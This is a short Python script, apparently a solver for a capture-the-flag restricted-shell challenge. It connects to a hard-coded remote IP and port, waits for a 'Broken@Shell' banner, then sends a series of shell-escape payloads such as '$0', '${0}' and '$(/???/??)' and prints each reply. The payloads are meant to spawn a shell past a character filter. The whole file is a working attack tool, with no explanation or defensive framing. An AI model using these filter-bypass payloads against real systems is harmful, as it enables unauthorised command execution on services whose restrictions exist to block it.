#!/usr/bin/env python3
import socket
import time

host = "94.237.57.1"
port = 33017

payloads = [
    "$0",
    "${0}",
    "/???/??",
    "/???/????",
    "${_}",
    "${!#}",
    "$(/???/??)",
]

for payload in payloads:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        # Leer banner
        banner = b""
        while True:
            try:
                chunk = s.recv(1024)
                if not chunk:
                    break
                banner += chunk
                if b"Broken@Shell" in banner:
                    break
            except socket.timeout:
                break
        
        print(f"\n=== Testing payload: {payload} ===")
        s.sendall(payload.encode() + b"\n")
        time.sleep(1)
        
        response = b""
        while True:
            try:
                chunk = s.recv(1024)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        print(response.decode('utf-8', errors='ignore'))
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")
    
    time.sleep(0.5)
